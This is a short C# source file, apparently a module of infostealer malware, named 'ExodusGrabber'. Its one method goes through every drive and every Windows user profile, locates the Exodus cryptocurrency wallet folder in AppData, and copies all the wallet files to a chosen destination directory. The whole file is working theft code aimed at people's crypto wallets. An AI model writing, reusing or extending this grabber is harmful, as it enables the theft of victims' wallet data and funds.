using System.IO;

public class ExodusGrabber
{
    public static void GrabExodus(string destinationDir)
    {
        foreach (var drive in DriveInfo.GetDrives())
        {
            foreach (var user in FileUtils.GetComputerUsers())
            {
                if (System.IO.Directory.Exists(drive + "\\Users\\" + user + "\\AppData\\Roaming\\Exodus\\exodus.wallet"))
                {
                    foreach (string file in System.IO.Directory.GetFiles(drive + "\\Users\\" + user + "\\AppData\\Roaming\\Exodus\\exodus.wallet"))
                    {
                        System.IO.File.Copy(file, destinationDir + "\\" + System.IO.Path.GetFileName(file));
                    }
                }
            }
        }
    }
}